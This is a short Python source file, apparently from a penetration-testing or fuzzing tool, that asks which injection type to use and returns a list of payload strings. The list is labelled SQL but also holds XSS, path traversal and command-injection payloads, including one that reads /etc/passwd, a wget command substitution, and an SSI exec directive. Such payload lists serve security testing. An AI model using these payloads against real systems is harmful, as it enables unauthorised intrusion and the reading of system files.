class Injections():
    def injection_options():
        injection_type = input('\n[!] What type of injection do you want?\
        (Options: SQL, Command, XSS, RCE, LDAP, Fuzzer)\
        \n-> ')

        return injection_type
        
    def sql_injections():
        sql_injections = ['0x200', "<script>alert('hacked')</script>", '../../etc/passwd',
            '; cat /etc/passwd', "$(`echo(wget http://google.com)`)", "' OR 'a'='a",
            '*/*', "') or (SELECT admin FROM users WHERE admin = true AND ''='",
            '<!--#exec cmd="ls ../"-->']

        return sql_injections
